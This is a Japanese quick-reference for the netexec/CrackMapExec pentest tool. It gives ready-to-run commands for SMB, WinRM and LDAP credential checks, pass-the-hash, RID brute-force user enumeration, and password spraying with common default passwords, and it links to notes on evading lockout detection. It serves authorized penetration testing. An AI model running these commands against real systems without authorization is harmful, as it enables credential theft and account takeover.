# Netexec（nxc）/ CrackMapExec（cme）クイックリファレンス

## 概要

netexec（`nxc`）は CrackMapExec（`cme`）の後継ツール。SMB・WinRM・LDAP 等の複数プロトコルで認証確認・パスワードスプレー・情報列挙を行える。

ペネトレ用Linuxディストリ（Kali Linux 等）2023.4以降は標準搭載。それ以前の環境では `pipx install netexec` でインストールする。古いペネトレ用Linuxディストリでは `crackmapexec`（`cme`）コマンドが使える場合があるが構文が一部異なる。

---

## 環境前提

| 環境 | コマンド | インストール方法 |
|------|---------|----------------|
| ペネトレ用Linuxディストリ 2023.4以降 | `nxc` | 標準搭載（インストール不要） |
| それ以前のペネトレ用Linuxディストリ | `nxc` | `pipx install netexec` |
| 古いペネトレ用Linuxディストリ（CME時代） | `cme` | プリインストール済みの場合あり（構文一部異なる） |

```bash
# バージョン確認
nxc --version
```

---

## よく使うコマンド

### SMB 認証確認

```bash
# 単一ユーザーで認証確認
nxc smb [IP] -u [USER] -p '[PASSWORD]'

# ドメインを指定する場合
nxc smb [IP] -u [USER] -p '[PASSWORD]' -d [DOMAIN]

# ハッシュで認証（Pass-The-Hash）
nxc smb [IP] -u [USER] -H '[NTLM_HASH]'
```

**出力の読み方：**

- `[+]` → 認証成功
- `[-]` → 認証失敗
- `(Pwn3d!)` → 管理者権限あり（PSExec / WMI でコマンド実行可能）

---

### WinRM 認証確認

```bash
# WinRM（5985ポート）で認証確認
nxc winrm [IP] -u [USER] -p '[PASSWORD]'

# [+] [IP] で PWNED! が出れば evil-winrm で接続可能
```

---

### LDAP 認証確認

```bash
# LDAP認証確認（AD環境）
nxc ldap [IP] -u [USER] -p '[PASSWORD]' -d [DOMAIN]
```

---

### パスワードスプレー

```bash
# ユーザーリストに対して単一パスワードを試す
# [Attacker] 以下はテスター端末で実行する。
nxc smb [IP] -u users.txt -p '[PASSWORD]' --continue-on-success

# 複数パスワードとユーザーリストの組み合わせ
nxc smb [IP] -u users.txt -p passwords.txt --continue-on-success
```

> **注意：** アカウントロックアウトポリシーに注意する。`--continue-on-success` で全ユーザーを試しても、
> ロックアウト閾値を超えると正規ユーザーが締め出される。AD環境では事前にロックアウトポリシーを確認する。

---

### Pass-The-Hash（SMB）

```bash
# NTLM ハッシュで認証
nxc smb [IP] -u [USER] -H '[NTLM_HASH]'

# 管理者ハッシュで Pwn3d! が出た場合、secretsdump 等に進む
```

---

### 共有フォルダの列挙

```bash
# 認証済みで共有一覧を取得
nxc smb [IP] -u [USER] -p '[PASSWORD]' --shares
```

---

### RID bruteforce によるドメインユーザー列挙

**何をしているのか：** Windows はユーザー・グループを SID（Security Identifier）で管理しており、SID の末尾の数字部分を **RID（Relative Identifier）** という。`--rid-brute` は RID を 500 から順に総当たりして、存在するすべてのユーザー・グループ名を取得する。通常の LDAP/RPC 列挙と同様の結果が得られるが、MSSQL や SMB 等の異なるプロトコルからも実行できる。

```bash
# [Attacker] SMB 経由（ドメインユーザーで接続した場合）
nxc smb [IP] -u [USER] -p '[PASSWORD]' --rid-brute

# [Attacker] MSSQL 経由（SQL認証ユーザーで接続した場合 → --local-auth が必要）
nxc mssql [IP] -u [USER] -p '[PASSWORD]' --local-auth --rid-brute

# ユーザー名だけを抽出してファイルに保存するパイプライン
# （ドメイン名\FirstName.LastName 形式のユーザーのみを抽出する）
nxc mssql [IP] -u [USER] -p '[PASSWORD]' --local-auth --rid-brute \
  | grep -oP '[DOMAIN]\\\\\w+\.\w+' \
  | cut -d '\' -f2 \
  | tee users
```

**`--local-auth` とは：** ドメイン認証ではなく、ローカルアカウントとして認証を行うオプション。SQL認証ユーザー（ドメインに属さない MSSQL のローカルユーザー）で接続した場合に必要。付けないとドメイン認証として試みるため、SQL認証ユーザーでは認証が通らない。

| 状況 | 使うオプション |
|------|-------------|
| ドメインユーザー（`DOMAIN\user` 形式）で認証 | なし（デフォルトがドメイン認証） |
| SQL認証ユーザー等のローカル認証 | `--local-auth` を付ける |

**パイプラインの各部の意味：**

| 部分 | 意味 |
|------|------|
| `grep -oP 'DOMAIN\\\w+\.\w+'` | 正規表現で `DOMAIN\FirstName.LastName` 形式の文字列のみを抽出。ドメイン名は実際のものに置き換える |
| `cut -d '\' -f2` | バックスラッシュで分割し、2番目の部分（ユーザー名）だけを取り出す |
| `tee users` | 標準出力に表示しながらファイルにも保存（後続のパスワードスプレーで使う） |

**出力例：**

```
firstname1.lastname1
firstname2.lastname2
firstname3.lastname3
...
```

**着眼点 — 取得後にすること：**

ユーザーリストができたら次は**パスワードスプレー**に進む。

**スプレーに使うパスワードの候補（優先順位順）：**

1. すでに取得済みの平文パスワード（他ユーザーへの使い回しを確認）
2. hashcat で短時間（目安：30分以内）でクラックできたパスワード
3. よくある初期パスワード（`Welcome1`・`Password1`・組織名+数字・季節+年 等）
4. hashcat の推定完了時間が現実的でない（1日以上）場合 → **担当者・対象組織に平文パスワードの提供を確認する**（グレーボックス前提では正当な選択肢）

```bash
# [Attacker] 取得したユーザーリストで WinRM へのパスワードスプレー
nxc winrm [IP] -u users -p '[PASSWORD]' --continue-on-success
# [+] ... (Pwn3d!) が出たユーザーが WinRM 接続可能
```

**刺さらなかったとき：**

- `--rid-brute` で `ACCESS_DENIED` になる → 権限が不足しているか、RPC/Windows セキュリティへのアクセスが制限されている。impacket-lookupsid を試す（`../02_Initial_Access/Protocol_Exploitation.md` RPC セクション参照）
- ドメイン名が不明で grep にマッチしない → まず `nxc smb [IP] -u [USER] -p '[PASSWORD]'` の出力でドメイン名（NetBIOS 名）を確認する。多くの場合 `domain:` ラベルの後ろに表示される
- **正規表現 `\w+\.\w+` がマッチしない（出力が空のまま）** → 組織のユーザー命名規則が `firstname.lastname` 形式以外（例：`jdunn`・`user001`・`j-dunn` 等）の場合、上記の正規表現は刺さらない。以下のように受け口を広げる：

```bash
# . を含まない命名規則も含めて広く受ける（DOMAIN\任意の連続文字）
nxc mssql [IP] -u [USER] -p '[PASSWORD]' --local-auth --rid-brute \
  | grep -oP '[DOMAIN]\\\S+' | cut -d'\' -f2 | tee users

# 「SidTypeUser」行のみを抽出してから cut（マシンアカウント `$` 終端を除外）
nxc smb [IP] -u [USER] -p '[PASSWORD]' --rid-brute \
  | grep 'SidTypeUser' | grep -oP '[DOMAIN]\\\S+' | cut -d'\' -f2 \
  | grep -v '\$$' | tee users
```

> **マシンアカウント（末尾 `$`）はパスワードスプレー対象から除外する。** マシンアカウントのパスワードはランダム生成120文字で辞書攻撃が通らないため、混じっているとスプレーのノイズになる。`grep -v '\$$'` で落とす。

---

## 注意点・落とし穴

- CrackMapExec（`cme`）と netexec（`nxc`）は構文がほぼ同じだが、オプション名が一部変わっている場合がある
- `--continue-on-success` を忘れると最初の成功でスキャンが止まる
- AD環境での大量スプレーはセキュリティログ（イベントID 4625）に記録される

---

## 関連技術
- 前：認証情報の発見 → `../02_Initial_Access/Credential_Discovery.md`
- 前：MSSQL 経由の認証情報・ユーザー取得 → `../02_Initial_Access/MSSQL_Exploitation.md`
- 前：`../02_Initial_Access/Account_Lockout_Recon.md`（`--pass-pol` でロックアウトポリシーを取得し、スプレーの試行設計に反映）
- 後：WinRM シェル取得 → `../02_Initial_Access/WinRM.md`
- 後：取得した認証情報での AD 侵入・権限昇格 → `../00_Playbook/Windows_AD_Attack_Flow.md`
- 後：`../02_Initial_Access/Default_Credentials.md`（SMB / WinRM / MSSQL の管理者デフォルト試行と組合せ）
- 後：`../02_Initial_Access/Account_Lockout_Recon.md`（複数パスワードスプレーの sleep 設計・継続試行検知の回避）
